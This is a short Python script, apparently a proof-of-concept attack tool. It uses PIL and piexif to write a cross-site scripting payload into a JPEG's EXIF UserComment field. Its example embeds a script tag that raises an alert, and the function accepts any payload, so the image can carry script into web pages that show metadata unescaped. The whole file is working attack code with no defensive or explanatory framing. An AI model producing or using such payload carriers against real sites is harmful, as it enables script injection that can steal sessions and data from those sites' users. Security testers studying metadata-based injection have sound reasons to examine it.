from PIL import Image
import piexif
def embed_xss_payload(image_path, output_path, payload):
    try:
        img = Image.open(image_path)
        exif_dict = piexif.load(img.info.get("exif", b""))
        payload_bytes = payload.encode("utf-8")
        exif_dict["Exif"][piexif.ExifIFD.UserComment] = payload_bytes
        exif_bytes = piexif.dump(exif_dict)
        img.save(output_path, "jpeg", exif=exif_bytes)
        print(f"Payload successfully embedded into {output_path}")
    except Exception as e:
        print(f"Error embedding payload: {e}")
if __name__ == "__main__":
    input_image = "input.jpg"
    output_image = "output_with_payload.jpg"
    xss_payload = "<script>alert('XSS');</script>"
    embed_xss_payload(input_image, output_image, xss_payload)
